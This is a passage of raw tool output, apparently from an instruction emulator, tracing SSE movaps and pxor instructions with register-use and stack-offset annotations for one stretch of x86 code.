0x8000 for stack size 0x10000 0x431a00: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x431a12: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x431a16: movaps xmm1, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x431a1a: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431a34: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431a38: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431a41: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431a44: movaps xmmword ptr [ebp - 0x40], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x431a4c: movaps xmm6, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431a50: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x431a58: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431a5f: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431a63: movaps xmm5, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x431a78: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431a9f: movaps xmm4, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x431aa7: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431ab4: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431ab8: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x431ac5: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x431ac8: movaps xmmword ptr [ebp - 0x40], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x431ad0: movaps xmmword ptr [ebp - 0x10], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431ad8: movaps xmmword ptr [ebp - 0x30], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x431adc: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431adf: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x431ae2: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431ae6: movaps xmm3, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x431aed: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431af1: movaps xmm2, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431af5: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x431b09: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431b0d: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431b19: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431b1d: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x431b2c: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x431b48: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431b55: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x431b59: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431b67: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431b6e: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431b76: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431b79: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x431b81: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431b85: movaps xmm5, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x431b91: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431bab: movaps xmm3, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7e50 for stack size 0x10000 0x431bba: movaps xmm4, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431bc2: pxor xmm4, xmm6, regs_read: [126, 128], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431bc6: movaps xmmword ptr [ebp - 0x30], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x431bd3: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431bd7: movaps xmmword ptr [ebp - 0x10], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431be4: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x431beb: movaps xmmword ptr [ebp - 0x20], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x431bf7: movaps xmmword ptr [ebp - 0x40], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x431bfb: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431bfe: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x431c01: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431c05: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431c09: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431c0c: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x431c21: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431c25: movaps xmm0, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x431c29: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431c2d: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x431c36: movaps xmmword ptr [ebp - 0xd0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x431c47: movaps xmm2, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431c70: movaps xmm6, xmmword ptr [ebp - 0xd0], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x431c77: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431c7b: movaps xmmword ptr [ebp - 0x50], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x431c8d: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431c91: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431c9a: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x431ca1: movaps xmmword ptr [ebp - 0xe0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x431cb1: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431cb4: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431cb8: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431cda: movaps xmmword ptr [ebp - 0x40], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x431ce9: movaps xmmword ptr [ebp - 0xd0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x431cf4: movaps xmm7, xmm4, regs_read: [126], regs_write: [129] 0x431cf7: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x431cfb: movaps xmm4, xmmword ptr [ebp - 0xe0], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x431d06: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431d0e: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431d12: movaps xmmword ptr [ebp - 0x90], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x431d22: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431d2f: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431d37: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x431d3a: movaps xmmword ptr [ebp - 0xe0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x431d41: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x431d49: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431d4c: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431d50: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x431d53: pxor xmm1, xmmword ptr [ebp - 0xd0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x431d5b: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x431d62: movaps xmm2, xmmword ptr [ebp - 0xe0], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x431d76: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431d7a: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x431d86: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431d8a: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x431d93: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x431da1: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431dca: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431ddf: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431de3: movaps xmmword ptr [ebp - 0xe0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x431def: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x431df6: movaps xmmword ptr [ebp - 0xd0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x431e02: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431e09: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431e0d: movaps xmm5, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x431e1a: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431e2d: movaps xmm6, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x431e35: movaps xmm4, xmmword ptr [ebp - 0xd0], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x431e40: movaps xmm3, xmmword ptr [ebp - 0xe0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x431e4f: movaps xmmword ptr [ebp - 0x50], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x431e53: pxor xmm4, xmm6, regs_read: [126, 128], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431e57: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431e6d: movaps xmmword ptr [ebp - 0xe0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x431e78: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x431e7b: movaps xmmword ptr [ebp - 0xd0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x431e86: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x431e8a: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431e8d: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x431e90: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431e94: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431e98: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x431e9b: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431eb0: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431eb4: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431eb8: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x431ec1: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x431ecf: movaps xmm2, xmmword ptr [ebp - 0xe0], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x431ed6: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x431f0e: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431f1f: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431f23: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431f2c: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x431f33: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x431f3f: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x431f42: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431f55: movaps xmm5, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x431f65: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431f7c: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x431f84: movaps xmm4, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x431f88: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431f99: movaps xmmword ptr [ebp - 0x30], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x431f9d: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x431fa1: pxor xmm4, xmm6, regs_read: [126, 128], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431fb2: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x431fb5: movaps xmmword ptr [ebp - 0x50], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x431fb9: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431fbd: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x431fc5: movaps xmm2, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x431fc9: movaps xmm5, xmm4, regs_read: [126], regs_write: [127] 0x431fd4: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x431fe4: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x431fe7: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x431ff0: movaps xmm7, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x431ff4: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x431ff8: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432008: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43200c: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x43201f: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432034: movaps xmmword ptr [ebp - 0x90], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x43203b: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43203f: movaps xmmword ptr [ebp - 0x20], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432043: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432055: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x43205c: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432060: movaps xmm5, xmmword ptr [ebp - 0x90], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x432067: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43206a: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43206e: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x432083: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4320a9: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4320b1: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4320b5: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4320cb: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4320d3: movaps xmmword ptr [ebp - 0x60], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x4320d7: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4320de: movaps xmmword ptr [ebp - 0x90], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x4320e9: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4320ed: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x4320fa: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4320fe: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432105: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x43211e: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432122: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43212e: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x432131: movaps xmm0, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 0x43214a: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432152: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432156: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43216b: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432179: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x432180: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432184: movaps xmm6, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432188: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43218b: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x43218f: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4321a8: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4321bd: movaps xmmword ptr [ebp - 0x20], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4321d3: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4321db: movaps xmm4, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x4321df: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4321f0: movaps xmmword ptr [ebp - 0x60], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x4321f4: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4321f8: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432209: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x43220c: movaps xmmword ptr [ebp - 0x90], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x432213: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432217: movaps xmmword ptr [ebp - 0x30], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x43221f: movaps xmm2, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x432223: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x43222a: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x432239: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x43223c: 